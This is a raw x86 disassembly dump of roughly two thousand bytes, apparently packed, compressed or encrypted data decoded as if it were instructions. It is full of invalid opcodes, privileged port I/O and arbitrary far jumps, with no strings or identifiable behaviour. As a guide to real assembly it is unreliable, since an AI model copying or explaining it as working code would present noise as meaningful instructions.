  4188f3:	and    eax,DWORD PTR [eax]
  4188f5:	outs   dx,BYTE PTR ds:[esi]
  4188f6:	add    ebx,DWORD PTR [eax+0x7b]
  4188f9:	mov    dl,0x1a
  4188fb:	into   
  4188fc:	mov    al,0xa1
  4188fe:	les    esi,FWORD PTR ds:0xc697b59c
  418904:	fldcw  WORD PTR ds:0xfb5e365e
  41890a:	(bad)  
  41890b:	sti    
  41890c:	xlat   BYTE PTR ds:[ebx]
  41890d:	xchg   edx,eax
  41890e:	sbb    DWORD PTR [eax+edi*8+0x11],0x667e4df0
  418916:	and    eax,0xf36b9445
  41891b:	jge    0x418943
  41891d:	leave  
  41891e:	mov    ds:0xb1c4c343,al
  418923:	mov    eax,0xadec0245
  418928:	mov    bh,0x2b
  41892a:	out    0xad,eax
  41892c:	xchg   ebp,eax
  41892d:	call   0xa9aba2fc
  418932:	outs   dx,DWORD PTR ds:[esi]
  418933:	jl     0x4188f3
  418935:	mov    bh,BYTE PTR [ebx+0x35]
  418938:	mov    esi,DWORD PTR [eax]
  41893a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41893b:	not    dl
  41893d:	adc    dl,BYTE PTR [ecx-0x2dcaff5d]
  418943:	add    al,0xa4
  418945:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418946:	adc    eax,0x32994b1c
  41894b:	inc    ecx
  41894c:	aas    
  41894d:	aad    0xc9
  41894f:	popa   
  418950:	int3   
  418951:	cs das 
  418953:	xchg   edi,eax
  418954:	clc    
  418955:	dec    esp
  418956:	and    ah,BYTE PTR [esi]
  418958:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418959:	mov    WORD PTR [edi-0xa674910],?
  41895f:	rcl    DWORD PTR [ecx],0x7
  418962:	sbb    sp,WORD PTR [edx+ebx*4]
  418966:	xor    edi,DWORD PTR [esi+0x38]
  418969:	jb     0x41891a
  41896b:	inc    eax
  41896c:	dec    ebp
  41896d:	test   al,0xf0
  41896f:	and    ax,0x297b
  418973:	sub    BYTE PTR [ebx],ah
  418975:	popf   
  418976:	out    0x2a,al
  418978:	xchg   ecx,eax
  418979:	jle    0x4189b2
  41897b:	mov    dh,0x19
  41897d:	outs   dx,DWORD PTR ds:[esi]
  41897e:	add    ecx,DWORD PTR [esi]
  418980:	sub    ch,BYTE PTR [eax+0xff09fb4]
  418986:	mov    esp,0x506cd5aa
  41898b:	mov    al,0xaa
  41898d:	pushf  
  41898e:	mov    ecx,DWORD PTR [edi+0x543965dd]
  418994:	adc    eax,0x3c89bf53
  418999:	int3   
  41899a:	fcmovnb st,st(3)
  41899c:	mov    DWORD PTR [eax-0x4],edx
  41899f:	mov    ch,BYTE PTR [eax]
  4189a1:	add    esi,DWORD PTR [edi-0x4d1987e4]
  4189a7:	add    BYTE PTR [edi+0x47],bh
  4189aa:	loop   0x418a28
  4189ac:	mov    ds:0xaf19c5cc,eax
  4189b1:	lods   al,BYTE PTR ds:[esi]
  4189b2:	mov    al,0x24
  4189b4:	jmp    0x7189:0x39a5492e
  4189bb:	addr16 (bad) 
  4189bd:	std    
  4189be:	cld    
  4189bf:	inc    edi
  4189c0:	mov    ch,0xc4
  4189c2:	daa    
  4189c3:	and    al,0x26
  4189c5:	push   ebx
  4189c6:	stos   BYTE PTR es:[edi],al
  4189c7:	mov    dh,BYTE PTR [ecx+0x4e]
  4189ca:	xchg   ebx,eax
  4189cb:	mov    al,0xad
  4189cd:	shl    DWORD PTR [ebx],1
  4189cf:	adc    DWORD PTR [edi-0x420738f8],ebp
  4189d5:	jmp    0x418981
  4189d7:	nop
  4189d8:	xchg   esp,eax
  4189d9:	add    edx,DWORD PTR gs:[ecx-0x4a5af757]
  4189e0:	or     dh,ah
  4189e2:	dec    ecx
  4189e3:	es jae 0x4189c0
  4189e6:	popa   
  4189e7:	jbe    0x418a38
  4189e9:	push   esp
  4189ea:	mov    bl,0x17
  4189ec:	(bad)  
  4189ed:	jb     0x418a43
  4189ef:	mov    bl,0xc6
  4189f1:	in     eax,dx
  4189f2:	xchg   BYTE PTR [esp+edx*1+0x69],ch
  4189f6:	pxor   mm7,mm0
  4189f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4189fa:	inc    ebp
  4189fb:	in     al,0xff
  4189fd:	jnp    0x418a6f
  4189ff:	rcl    ah,1
  418a01:	out    dx,eax
  418a02:	push   ss
  418a03:	push   edi
  418a04:	adc    al,BYTE PTR [esi+0x4d]
  418a07:	(bad)
  418a0a:	pop    ds
  418a0b:	jp     0x418a6e
  418a0d:	xchg   ecx,eax
  418a0e:	mov    ecx,0x5cf80d43
  418a13:	mov    cl,0xe5
  418a15:	ret    0xf44d
  418a18:	xor    eax,0x8e76be50
  418a1d:	test   DWORD PTR [edi+ebx*1-0x75],esp
  418a21:	inc    ebp
  418a22:	or     al,0x33
  418a24:	ror    DWORD PTR [ebx-0x3dfc07b3],0xf
  418a2b:	scas   eax,DWORD PTR es:[edi]
  418a2c:	shr    ecx,0xba
  418a2f:	and    eax,DWORD PTR [eax]
  418a31:	add    al,bh
  418a33:	loope  0x4189be
  418a35:	mov    ah,0x87
  418a37:	test   bl,al
  418a39:	mov    ebp,0x3e8f68ea
  418a3e:	lods   al,BYTE PTR ds:[esi]
  418a3f:	(bad)  
  418a40:	ficomp DWORD PTR [eax+0x62611f39]
  418a46:	rcr    BYTE PTR [edi+0x62],0x62
  418a4a:	adc    DWORD PTR [ebp+0x1],esi
  418a4d:	lods   eax,DWORD PTR ds:[esi]
  418a4e:	fmul   st,st(4)
  418a50:	mov    dl,0x59
  418a52:	xor    eax,0x81a03491
  418a57:	inc    eax
  418a58:	rcr    DWORD PTR [ebx+0x74],0xc0
  418a5c:	adc    DWORD PTR [ecx],esp
  418a5e:	stos   BYTE PTR es:[edi],al
  418a5f:	mov    eax,0xbd129b06
  418a64:	setno  BYTE PTR [edi]
  418a67:	aam    0x94
  418a69:	cli    
  418a6a:	or     ch,al
  418a6c:	hlt    
  418a6d:	pop    es
  418a6e:	push   edx
  418a6f:	out    dx,eax
  418a70:	clc    
  418a71:	push   esp
  418a72:	push   cs
  418a73:	or     DWORD PTR [edx],eax
  418a75:	jae    0x418ad8
  418a77:	fisttp WORD PTR [ebp+eiz*2+0x59e0752f]
  418a7e:	aam    0x1c
  418a80:	xchg   ecx,eax
  418a81:	call   0x4e843410
  418a86:	jns    0x418a0a
  418a88:	aad    0x18
  418a8a:	push   eax
  418a8b:	mov    dh,0x9c
  418a8d:	cs test eax,0xcfd8ba2b
  418a93:	and    ecx,esp
  418a95:	xchg   ebp,eax
  418a96:	jmp    0x418a69
  418a98:	stos   DWORD PTR es:[edi],eax
  418a99:	xchg   DWORD PTR [esi+edi*8],edx
  418a9c:	dec    edi
  418a9d:	pop    ss
  418a9e:	adc    bh,bh
  418aa0:	es cmp ah,dl
  418aa3:	cld    
  418aa4:	data16 sbb BYTE PTR [edi+0x66],bh
  418aa8:	fldcw  WORD PTR [ecx]
  418aaa:	cmp    eax,0x40ee9a13
  418aaf:	cmc    
  418ab0:	and    BYTE PTR [edi],dl
  418ab2:	sub    al,0x90
  418ab5:	xor    DWORD PTR [esi+ebp*2],ebp
  418ab8:	inc    eax
  418ab9:	pusha  
  418aba:	mov    edx,0x93b71c4f
  418abf:	call   0x9300:0x5e864e0b
  418ac6:	xor    DWORD PTR [eax+0x68e62013],esi
  418acc:	and    bl,BYTE PTR [edx-0x3f]
  418acf:	push   ds
  418ad0:	out    0x53,eax
  418ad2:	lahf   
  418ad3:	in     al,0x69
  418ad5:	mov    al,0x73
  418ad7:	xchg   edx,eax
  418ad8:	jecxz  0x418b08
  418ada:	pop    esp
  418adb:	xchg   DWORD PTR [eax-0x30],ecx
  418ade:	into   
  418adf:	ret    0xdf13
  418ae2:	cmp    DWORD PTR [esi+0xa],ecx
  418ae5:	in     eax,0x4f
  418ae7:	lahf   
  418ae8:	je     0x418a9d
  418aea:	call   0x27f7:0x38083846
  418af1:	cmp    DWORD PTR [ebx+0x61],eax
  418af4:	adc    al,BYTE PTR [edx+0x27]
  418af7:	push   es
  418af8:	push   0xffffff95
  418afa:	mov    al,ds:0xb2edd23b
  418aff:	xchg   esp,eax
  418b00:	jl     0x418b56
  418b02:	mov    dl,0x33
  418b04:	(bad)  
  418b05:	punpcklwd mm5,mm2
  418b08:	clc    
  418b09:	inc    edi
  418b0a:	or     edx,esp
  418b0c:	xchg   DWORD PTR [esi-0x14],edx
  418b0f:	pusha  
  418b10:	mov    BYTE PTR [bp+di],0x5
  418b14:	push   0xf67b85c
  418b19:	out    0x29,al
  418b1b:	sub    DWORD PTR [ebx+0x975765b],esi
  418b21:	ror    DWORD PTR [edx-0x327c297c],cl
  418b27:	inc    ebx
  418b28:	cld    
  418b29:	idiv   BYTE PTR [edi+esi*8]
  418b2c:	ret    
  418b2d:	loop   0x418b91
  418b2f:	arpl   WORD PTR [edi-0x44bec5b4],cx
  418b35:	loope  0x418ab8
  418b37:	(bad)  
  418b38:	fmul   QWORD PTR ds:0xe7fb509a
  418b3e:	mov    dl,0xf3
  418b40:	and    DWORD PTR [ebp+0x7b],ebp
  418b43:	daa    
  418b44:	pop    ds
  418b45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b46:	aas    
  418b47:	cdq    
  418b48:	cmc    
  418b49:	leave  
  418b4a:	popa   
  418b4b:	push   0x2d
  418b4d:	mov    cl,0x70
  418b4f:	retf   
  418b50:	jne    0x418bbe
  418b52:	inc    eax
  418b53:	pop    es
  418b54:	sti    
  418b55:	adc    eax,0xdff932b8
  418b5a:	jae    0x418b15
  418b5c:	mov    edx,0xf6a1a660
  418b61:	mov    esp,0xb721d1e1
  418b66:	mov    ah,0xbb
  418b68:	(bad)  
  418b6a:	mov    bh,BYTE PTR [eax-0x37b1c385]
  418b70:	int3   
  418b71:	repz inc ebp
  418b73:	fbld   TBYTE PTR [edx-0x6c9b8e01]
  418b79:	lahf   
  418b7a:	ficomp DWORD PTR [edi-0x78b1ca60]
  418b80:	xchg   ebx,eax
  418b81:	push   ds
  418b82:	xchg   edi,eax
  418b83:	std    
  418b84:	mov    BYTE PTR [ebx-0x28767d3],ah
  418b8a:	rcl    esi,1
  418b8c:	test   eax,0xa9130693
  418b91:	popf   
  418b92:	lea    edx,[esi+esi*8-0x4341e918]
  418b99:	ja     0x418b3f
  418b9b:	scas   al,BYTE PTR es:[edi]
  418b9c:	inc    edx
  418b9d:	mov    ebx,0x616a63d
  418ba2:	ins    DWORD PTR es:[edi],dx
  418ba3:	stos   BYTE PTR es:[edi],al
  418ba4:	test   bh,dl
  418ba6:	psubusw mm3,QWORD PTR [ebx-0x2d]
  418baa:	jb     0x418bfd
  418bac:	jl     0x418b5d
  418bae:	sti    
  418baf:	inc    esp
  418bb0:	push   edi
  418bb1:	pop    esi
  418bb2:	mov    ah,0x65
  418bb4:	dec    edi
  418bb5:	mov    eax,ds:0x8dab626a
  418bba:	dec    eax
  418bbb:	cmp    DWORD PTR [eax-0x7b85f8f6],ecx
  418bc1:	lock shl DWORD PTR [ebp-0x5d],0x8e
  418bc6:	les    ecx,FWORD PTR [ecx+0xf42c129]
  418bcc:	iret   
  418bcd:	ds add eax,0xa62bd546
  418bd3:	call   0x7c38:0x21411322
  418bda:	xlat   BYTE PTR ds:[ebx]
  418bdb:	cmp    ah,bh
  418bdd:	sub    BYTE PTR [eax-0x37],al
  418be0:	pop    eax
  418be1:	std    
  418be2:	push   ecx
  418be3:	iret   
  418be4:	leave  
  418be5:	fstp   st(5)
  418be7:	jae    0x418bfe
  418be9:	rdpmc  
  418beb:	outs   dx,DWORD PTR ds:[esi]
  418bec:	int3   
  418bed:	sti    
  418bee:	pop    edi
  418bef:	add    DWORD PTR [ebx-0x6a],eax
  418bf2:	outs   dx,BYTE PTR ds:[esi]
  418bf3:	cs jo  0x418c1a
  418bf6:	mov    BYTE PTR [ebp+ebx*2+0x60],bh
  418bfa:	and    al,0x1f
  418bfc:	fistp  QWORD PTR [eax-0x3007b518]
  418c02:	and    BYTE PTR [edi+eax*1],bl
  418c05:	sahf   
  418c06:	pop    esi
  418c07:	jnp    0x418baa
  418c09:	les    edx,FWORD PTR [edi]
  418c0b:	jne    0x418bd3
  418c0d:	xor    eax,DWORD PTR [ebx+0x5d]
  418c10:	ret    
  418c11:	or     al,0x7c
  418c13:	dec    ecx
  418c14:	clc    
  418c15:	mov    ecx,0x56e7d73e
  418c1a:	xor    ah,al
  418c1c:	jns    0x418bac
  418c1e:	push   ebp
  418c1f:	jns    0x418c29
  418c21:	pop    ecx
  418c22:	das    
  418c23:	cmp    DWORD PTR [ebp+0x1b7417db],ecx
  418c29:	mov    ebx,0xeeb5b757
  418c2e:	adc    eax,0x6e6d32bc
  418c33:	and    BYTE PTR [edi],ah
  418c35:	(bad)  
  418c36:	adc    DWORD PTR [eax],ebp
  418c38:	xor    ecx,DWORD PTR [ecx+0x3b181629]
  418c3e:	or     esp,esi
  418c40:	push   0xffffff82
  418c42:	jge    0x418c68
  418c44:	and    al,0x99
  418c46:	cmp    edi,esi
  418c48:	mov    edx,0xe043b2cb
  418c4d:	sbb    ah,0xfd
  418c50:	sbb    DWORD PTR [ecx+0x32b37b17],0x6b
  418c57:	pop    esp
  418c58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c59:	and    BYTE PTR [ecx+0x6e54a8e4],ah
  418c5f:	push   ss
  418c60:	stc    
  418c61:	sub    eax,0x59ac82e
  418c66:	je     0x418c25
  418c68:	dec    ebx
  418c69:	sbb    DWORD PTR [ebp+0x7d],ecx
  418c6c:	(bad)
  418c6f:	mov    dl,0x95
  418c71:	push   ebx
  418c72:	jne    0x418ce4
  418c74:	jg     0x418c07
  418c76:	xchg   DWORD PTR [edx+0x64],edi
  418c79:	pop    esp
  418c7a:	in     eax,0x2f
  418c7c:	iret   
  418c7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c7e:	jbe    0x418cba
  418c80:	or     DWORD PTR [ebx+esi*2],ebx
  418c83:	js     0x418c58
  418c85:	mov    BYTE PTR [esi+0x535fd458],dl
  418c8b:	(bad)  
  418c8d:	push   esi
  418c8e:	loop   0x418d04
  418c90:	and    eax,0x1a3820ac
  418c95:	pushf  
  418c96:	cwde   
  418c97:	push   esi
  418c98:	sbb    al,0x9b
  418c9a:	je     0x418cc1
  418c9c:	push   ebx
  418c9d:	sbb    al,0x5f
  418c9f:	ins    BYTE PTR es:[edi],dx
  418ca0:	test   eax,0x3344747a
  418ca5:	jno    0x418c41
  418ca7:	push   ds
  418ca8:	jg     0x418cdc
  418caa:	and    bh,BYTE PTR [eax-0x3487ece9]
  418cb0:	sar    BYTE PTR [edi],0x5b
  418cb3:	xchg   ebx,eax
  418cb4:	push   ebp
  418cb5:	push   ds
  418cb6:	or     eax,0x626c540b
  418cbb:	out    0xed,eax
  418cbd:	mov    eax,0x271d9dcb
  418cc2:	xchg   edi,eax
  418cc3:	cdq    
  418cc4:	(bad)  
  418cc5:	dec    dl
  418cc7:	fild   WORD PTR [ecx-0x2ece9706]
  418ccd:	fsubr  st(1),st
  418ccf:	jbe    0x418d1a
  418cd1:	lods   al,BYTE PTR ss:[esi]
  418cd3:	mov    bh,0x1e
  418cd5:	cld    
  418cd6:	or     ebx,DWORD PTR [eax]
  418cd8:	jmp    0xc37b:0x48b3cc21
  418cdf:	jae    0xeaa6c4f9
  418ce5:	(bad)  
  418ce6:	mov    ecx,0xde045b2f
  418ceb:	xor    al,0x36
  418ced:	xchg   al,ch
  418cef:	or     al,0xd3
  418cf1:	and    bl,BYTE PTR [ebx-0x270ebd6]
  418cf7:	push   ebp
  418cf8:	stc    
  418cf9:	dec    ecx
  418cfa:	loope  0x418d45
  418cfc:	clc    
  418cfd:	bnd je 0x418d60
  418d00:	inc    edi
  418d01:	jg     0x418d2b
  418d03:	test   DWORD PTR gs:[ecx+edi*2+0x7f],ecx
  418d08:	clc    
  418d09:	push   esi
  418d0a:	cmp    al,0x56
  418d0c:	pop    ss
  418d0d:	push   esp
  418d0e:	mov    BYTE PTR [esi+0x771c200d],ch
  418d14:	cmc    
  418d15:	jo     0x418cc8
  418d17:	inc    edi
  418d18:	test   eax,0xf33978bd
  418d1d:	aad    0xca
  418d1f:	(bad)  
  418d20:	outs   dx,BYTE PTR ds:[esi]
  418d21:	jge    0x418cb4
  418d23:	jg     0x418d6b
  418d25:	push   esi
  418d26:	and    eax,0x7a3a7acd
  418d2b:	inc    edx
  418d2c:	cli    
  418d2d:	and    DWORD PTR [ebx],edx
  418d2f:	dec    eax
  418d30:	xor    ah,BYTE PTR [ebx]
  418d32:	sbb    eax,0xafaf0d13
  418d37:	sub    eax,0x494339fb
  418d3c:	fs arpl ax,cx
  418d3f:	pusha  
  418d40:	xor    dh,cl
  418d42:	mov    edi,0x26af972
  418d47:	inc    esp
  418d48:	xchg   BYTE PTR [eax],dh
  418d4a:	xchg   esi,eax
  418d4b:	sahf   
  418d4c:	push   ebp
  418d4d:	dec    eax
  418d4e:	mov    edx,0xd2f876a1
  418d53:	stc    
  418d54:	sbb    esp,esi
  418d56:	aam    0x93
  418d58:	clc    
  418d59:	sub    eax,0x9d732e75
  418d5e:	mov    ?,WORD PTR [esi-0x27]
  418d61:	mov    ss,WORD PTR [esi+0x44852b6e]
  418d67:	cmp    eax,0x3831552b
  418d6c:	loope  0x418d17
  418d6e:	and    BYTE PTR [ebp+0x5e],dh
  418d71:	pop    esp
  418d72:	sbb    cl,BYTE PTR [esp+edi*2-0x5b]
  418d76:	adc    eax,0x3ecc0602
  418d7b:	fidiv  WORD PTR [ebx-0xb]
  418d7e:	cmp    al,0xe2
  418d80:	or     dh,BYTE PTR [edi]
  418d82:	push   edi
  418d83:	inc    esp
  418d84:	push   esp
  418d85:	test   DWORD PTR [esp+ebp*8+0x35e17270],ebp
  418d8c:	push   ds
  418d8d:	fadd   st(2),st
  418d8f:	out    dx,eax
  418d90:	scas   eax,DWORD PTR es:[edi]
  418d91:	ror    DWORD PTR [edi-0x136faf4d],1
  418d97:	add    al,0xdf
  418d99:	xchg   edx,eax
  418d9a:	sahf   
  418d9b:	xor    bh,bl
  418d9d:	jne    0x418d98
  418d9f:	mov    DWORD PTR [ecx],ecx
  418da1:	dec    ebp
  418da2:	rcr    ecx,1
  418da4:	add    al,BYTE PTR [edi+0x4f2a04d1]
  418daa:	adc    esp,esp
  418dac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418dad:	cmp    edx,0xaa61fe80
  418db3:	mov    esi,0x6f3d298f
  418db8:	fwait
  418db9:	cmp    al,0xc8
  418dbb:	mov    ds:0x176d555e,eax
  418dc0:	fld    DWORD PTR [esi-0x32f26741]
  418dc6:	fadd   st,st(1)
  418dc8:	jle    0x418e16
  418dca:	je     0x418dad
  418dcc:	dec    edx
  418dcd:	loope  0x418d82
  418dcf:	push   ebp
  418dd1:	js     0x418d77
  418dd3:	inc    ebp
  418dd4:	mov    eax,eax
  418dd6:	push   ecx
  418dd7:	out    dx,al
  418dd8:	repz mov ds:0xd71c9d8c,eax
  418dde:	adc    eax,0x67064999
  418de3:	sbb    ah,BYTE PTR [esi-0x8f25c0a]
  418de9:	mov    ebp,0x7c9ac44e
  418dee:	pop    es
  418def:	ja     0x418db2
  418df1:	inc    ebx
  418df2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418df3:	out    0xb2,al
  418df5:	imul   esi,DWORD PTR [ebx+0x7e8e91f9],0xe57168ac
  418dff:	loopne 0x418df9
  418e01:	sub    al,0x36
  418e03:	dec    eax
  418e04:	imul   DWORD PTR [eax+0x96b882e]
  418e0a:	test   eax,0x1321212c
  418e0f:	in     al,dx
  418e10:	popa   
  418e11:	adc    DWORD PTR [ecx],ecx
  418e13:	stos   DWORD PTR es:[edi],eax
  418e14:	mov    edx,0xead1034e
  418e19:	out    dx,eax
  418e1a:	stos   DWORD PTR es:[edi],eax
  418e1b:	dec    al
  418e1d:	mov    edi,0x34430d8b
  418e22:	cmp    BYTE PTR [ebp+0x43],0xbe
  418e26:	lods   eax,DWORD PTR ds:[esi]
  418e27:	inc    ebx
  418e28:	mov    al,0x2b
  418e2a:	mov    bh,BYTE PTR [ebx+ecx*4]
  418e2d:	xor    bl,BYTE PTR [edx]
  418e2f:	add    al,0x4
  418e31:	test   al,0x99
  418e33:	lods   al,BYTE PTR ds:[esi]
  418e34:	ins    BYTE PTR es:[edi],dx
  418e35:	and    eax,0x115a790b
  418e3a:	(bad)  
  418e3b:	out    0x3b,eax
  418e3d:	or     bh,BYTE PTR [esi]
  418e3f:	jo     0x418dc6
  418e41:	and    al,0xf1
  418e43:	jae    0x418e70
  418e45:	jge    0x418e50
  418e47:	xchg   edi,eax
  418e48:	shl    dh,0x64
  418e4b:	xchg   esi,eax
  418e4c:	call   0x9c1982db
  418e51:	adc    DWORD PTR [ecx],ecx
  418e53:	sub    dl,BYTE PTR [ebx]
  418e55:	mov    dl,0x9f
  418e57:	lahf   
  418e58:	or     DWORD PTR [esi],0x57
  418e5b:	sbb    edx,DWORD PTR [edx+ebp*8-0x56]
  418e5f:	cdq    
  418e60:	retf   
  418e61:	sbb    edx,ebx
  418e63:	jmp    0x1cfcc31f
  418e68:	dec    ebp
  418e69:	inc    ebx
  418e6a:	push   cs
  418e6b:	test   bl,0x33
  418e6e:	(bad)  
  418e6f:	pop    edx
  418e70:	or     eax,0x973f18b1
  418e75:	push   edx
  418e76:	mov    esi,0xc91e3c21
  418e7b:	jp     0x418eb0
  418e7d:	ins    DWORD PTR es:[edi],dx
  418e7e:	jbe    0x418e83
  418e80:	pop    ebp
  418e81:	or     bl,al
  418e83:	arpl   WORD PTR [edx],bp
  418e85:	stc    
  418e86:	aad    0xf1
  418e88:	mov    eax,ds:0x78c853e
  418e8d:	pop    esi
  418e8e:	xor    DWORD PTR [edi+edx*4+0x433d4fc0],ecx
  418e95:	fstp   QWORD PTR [ebp+0x5c]
  418e98:	cmp    esp,DWORD PTR [eiz*2+0x2cd54a92]
  418e9f:	jmp    0x418e58
  418ea1:	add    BYTE PTR [ecx-0x1b],dl
  418ea4:	mov    eax,DWORD PTR [ecx]
  418ea6:	daa    
  418ea7:	add    DWORD PTR [ebx-0x66378cae],esi
  418ead:	adc    esi,DWORD PTR [edx+0x3608942a]
  418eb3:	and    eax,0xa92c84c8
  418eb8:	push   esi
  418eb9:	sub    BYTE PTR es:[ebx],dh
  418ebc:	adc    al,0x85
  418ebe:	imul   ecx,DWORD PTR [edi],0xab51bc0c
  418ec4:	sbb    BYTE PTR [esi+0x7b],dh
  418ec7:	cmc    
  418ec8:	jae    0x418e8c
  418eca:	stos   BYTE PTR es:[edi],al
  418ecb:	push   ebx
  418ecc:	jle    0x418e8f
  418ece:	mov    BYTE PTR [eax-0x4e],bl
  418ed1:	xor    al,0x30
  418ed3:	call   0x477008b3
  418ed8:	hlt    
  418ed9:	add    DWORD PTR [eax],0x73fc70a1
  418edf:	shr    ebx,0x9e
  418ee2:	mov    al,ds:0x7e3b45a0
  418ee7:	or     BYTE PTR [ecx],0xc5
  418eea:	int3   
  418eeb:	and    DWORD PTR [ecx],ecx
  418eed:	push   edi
  418eee:	inc    ebp
  418eef:	fidiv  DWORD PTR [eax+esi*1-0x6]
  418ef3:	ja     0x418f15
  418ef5:	addr16 inc edi
  418ef7:	pop    ebp
  418ef8:	nop
  418ef9:	test   al,0x18
  418efb:	add    al,0x7c
  418efd:	cmp    ecx,DWORD PTR [edx+0x1e]
  418f00:	icebp  
  418f01:	jecxz  0x418eb2
  418f03:	lock push ecx
  418f05:	lahf   
  418f06:	jle    0x418ed6
  418f08:	out    dx,eax
  418f09:	cmc    
  418f0a:	xor    BYTE PTR [eax+0x16],dl
  418f0d:	pop    ecx
  418f0e:	mov    bh,0x85
  418f10:	sub    esi,ebx
  418f12:	jl     0x418ed4
  418f14:	out    dx,al
  418f15:	loope  0x418ea7
  418f17:	sub    edx,DWORD PTR [edi+0x436f83dc]
  418f1d:	mov    ecx,0xfd840403
  418f22:	inc    ebx
  418f23:	loop   0x418ec2
  418f25:	test   BYTE PTR [edi+esi*1],bl
  418f28:	int3   
  418f29:	xchg   ecx,eax
  418f2a:	push   ecx
  418f2b:	pop    edx
  418f2c:	test   DWORD PTR [eax-0x53],0x3979b068
  418f33:	fcmovb st,st(3)
  418f35:	adc    dl,BYTE PTR [ebp-0x67]
  418f38:	cmovp  ecx,DWORD PTR [esi]
  418f3b:	fimul  DWORD PTR [edx+0xb]
  418f3e:	xor    DWORD PTR [ecx+edi*4-0x13],0x3128033b
  418f46:	or     ah,BYTE PTR [edx-0x63]
  418f49:	mov    ebp,0x76aa39d0
  418f4e:	mov    edx,cs
  418f50:	jbe    0x418fa9
  418f52:	sub    al,0x3e
  418f54:	mov    dh,0xe2
  418f56:	out    0xc3,al
  418f58:	inc    ebp
  418f59:	stos   BYTE PTR es:[edi],al
  418f5a:	dec    esi
  418f5b:	hlt    
  418f5c:	in     eax,dx
  418f5d:	fucomip st,st(1)
  418f5f:	outs   dx,DWORD PTR ds:[esi]
  418f60:	pop    esp
  418f61:	repz pusha 
  418f63:	adc    esi,DWORD PTR [ebx]
  418f65:	dec    ecx
  418f66:	jecxz  0x418f7b
  418f68:	mov    ch,0x8c
  418f6a:	dec    esp
  418f6b:	or     dh,al
  418f6d:	or     edx,edi
  418f6f:	xchg   ebx,eax
  418f70:	or     DWORD PTR [ebp+eax*4+0x24],eax
  418f74:	nop
  418f75:	adc    DWORD PTR [eax],0x2449308f
  418f7b:	xlat   BYTE PTR ds:[ebx]
  418f7c:	mov    ds:0x8f8ba85,al
  418f81:	xchg   ecx,eax
  418f82:	mov    ch,BYTE PTR [edi]
  418f84:	pop    edi
  418f85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f86:	and    DWORD PTR [esp+esi*8-0x48048ee0],ebp
  418f8d:	test   eax,0x3422be8b
  418f92:	xchg   ebx,eax
  418f93:	aam    0xd2
  418f95:	add    ebp,eax
  418f97:	fdivrp st(4),st
  418f99:	push   esi
  418f9a:	jl     0x418f1c
  418f9c:	or     ebp,DWORD PTR [eax]
  418f9e:	in     al,0x4b
  418fa0:	mov    edx,0x2a49017b
  418fa5:	mov    eax,ds:0x8e7a3fe6
  418faa:	inc    ecx
  418fab:	dec    edx
  418fac:	push   ecx
  418fad:	add    DWORD PTR ds:[esi],0xbb426137
  418fb4:	pusha  
  418fb5:	(bad)  
  418fb6:	popf   
  418fb7:	cwde   
  418fb8:	out    dx,eax
  418fb9:	mov    ebx,0xc2cdf0b8
  418fbe:	xchg   esi,eax
  418fbf:	lahf   
  418fc0:	xchg   edx,eax
  418fc1:	sar    BYTE PTR [esi],0xe8
  418fc4:	fs pop edi
  418fc6:	adc    al,0xcf
  418fc8:	pop    ss
  418fc9:	hlt    
  418fca:	mov    dl,0x7
  418fcc:	add    eax,0xe37e65f0
  418fd1:	lds    ebp,FWORD PTR [eax-0x419f320d]
  418fd7:	ficom  WORD PTR [esp+esi*1]
  418fda:	adc    eax,0x8b9f7625
  418fdf:	push   ss
  418fe0:	test   eax,0xa651eb69
  418fe5:	mov    dl,0x62
  418fe7:	cmp    DWORD PTR [edi+0x7a],esp
  418fea:	fabs   
  418fec:	xchg   esp,eax
  418fed:	pop    ecx
  418fee:	out    dx,eax
  418fef:	or     DWORD PTR [edi+ebp*2-0x28a6177c],ebp
  418ff6:	push   esi
  418ff7:	out    0xc2,eax
  418ff9:	jns    0x41904a
  418ffb:	pop    es
  418ffc:	pop    es
  418ffd:	sub    cl,BYTE PTR [eax]
  418fff:	stc    
  419000:	sar    DWORD PTR [esi-0x39],0x8b
  419004:	jnp    0x419060
  419006:	adc    BYTE PTR gs:[esi+0x2d],0x9f
  41900b:	adc    eax,0xea12aa1
  419010:	frstor [ebp+esi*2+0x64]
  419014:	ret    0xabd7
  419017:	mov    ah,0xae
  419019:	inc    esp
  41901a:	cmp    BYTE PTR [ebx+eax*4],dl
  41901d:	xchg   BYTE PTR [edi+0x49],dh
  419020:	pop    ss
  419021:	loop   0x418fda
  419023:	cmp    eax,ecx
  419025:	push   edx
  419026:	leave  
  419027:	sar    DWORD PTR [ebp-0x7fcc357d],1
  41902d:	sbb    edi,DWORD PTR [edx+0x38]
  419030:	mov    cl,0x56
  419032:	fidivr WORD PTR [ecx]
  419034:	lods   al,BYTE PTR ds:[esi]
  419035:	sahf   
  419036:	outs   dx,BYTE PTR ds:[esi]
  419037:	dec    ebp
  419038:	rcl    DWORD PTR [edx+0x6a],1
  41903b:	pop    esp
  41903c:	push   0x969934d7
  419041:	ror    DWORD PTR [edx-0x2a],cl
  419044:	dec    edx
  419045:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419046:	fidiv  DWORD PTR [esi-0x6fde9935]
  41904c:	pop    ss
  41904d:	xchg   edi,eax
  41904e:	mov    WORD PTR [ecx],ss
  419050:	ins    BYTE PTR es:[edi],dx
  419051:	(bad)  
  419052:	push   ds
  419053:	xchg   edi,eax
  419054:	mov    dh,0x9f
  419056:	leave  
  419057:	pop    ss
  419058:	mov    ds,WORD PTR [esi-0x42]
  41905b:	and    eax,0xc76eda1c
  419060:	mov    dh,0xf1
  419062:	mov    al,ds:0xfc1e0e90
  419067:	mov    bl,al
  419069:	mov    eax,ds:0xa748a616
  41906e:	(bad)  
  41906f:	mov    esp,0xc0bf7e65
  419074:	pop    ss
  419075:	and    al,0x48
  419077:	pop    edx
  419078:	ficomp WORD PTR [edi+ecx*8+0x47]
  41907c:	lods   al,BYTE PTR ds:[esi]
  41907d:	je     0x419032
  41907f:	fs mov bl,0x85
